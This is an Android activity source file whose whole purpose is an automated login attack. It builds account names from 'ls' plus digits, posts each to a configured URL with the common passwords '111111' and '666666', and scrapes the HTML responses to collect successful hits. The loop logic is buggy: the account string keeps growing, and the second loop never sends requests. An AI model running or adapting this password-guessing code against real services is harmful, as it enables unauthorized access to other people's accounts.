package com.jimbo.myapplication;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;

import com.jimbo.myapplication.utils.NetWorkPost;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import java.util.HashMap;
import java.util.Map;

/**
 *
 * Created by jimbo on 2015/10/25.
 */
public class StartActivity extends Activity {

    String successZH = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start);

        try {
            start();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void start() throws InterruptedException {
        String zh = "ls";
        for (int g = 0; g < 10; g++) {
            for (int s = 0; s < 10; s++) {
                for (int b = 0; b < 10; b++) {
                    zh += g+""+s+""+b;
                    postStart(zh);
                    Thread.sleep(1000);
                }
            }
        }

        for (int qq = 0; qq < 10; qq++) {
            for (int gg = 0; gg < 10; gg++) {
                for (int ss = 0; ss < 10; ss++) {
                    for (int bb = 0; bb < 10; bb++) {
                        zh += gg+""+ss+""+bb;
                        Thread.sleep(1000);
                    }
                }
            }
        }
    }


    private void postStart(String zh) {
        new NetWorkPost(getSDNU(zh, "111111"), Config.URL, handler).start();
        new NetWorkPost(getSDNU(zh, "666666"), Config.URL, handler).start();
    }

    private Map<String, String> getSDNU(String zh, String ps) {
        Map<String, String> map = new HashMap<>();
        map.put("id", "2000");
        map.put("strAccount", zh);
        map.put("strPassword", ps);
        map.put("savePWD", "0");
        return map;
    }

    Handler handler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {
            int what = msg.what;
            String html = (String) msg.obj;

            if (1 == what) {
                String message = getMessage(html);
                if (isSuccessUp(message)) {
                    successZH += message+"\n";
                }
            } else {
                successZH +="失败";
            }

            return true;
        }
    });

    private String getMessage(String html) {
        Document doc = Jsoup.parse(html);
        Elements div = doc.getElementsByClass("b_cernet");
        Elements trs = div.get(0).getElementsByTag("tr");
        String message = trs.get(1).text();
        return message;
    }

    private boolean isSuccessUp(String message) {
        if (message.contains("has been sent")) {
            return true;
        } else if (message.contains("成功")) {
            return true;
        }
        return false;
    }

}
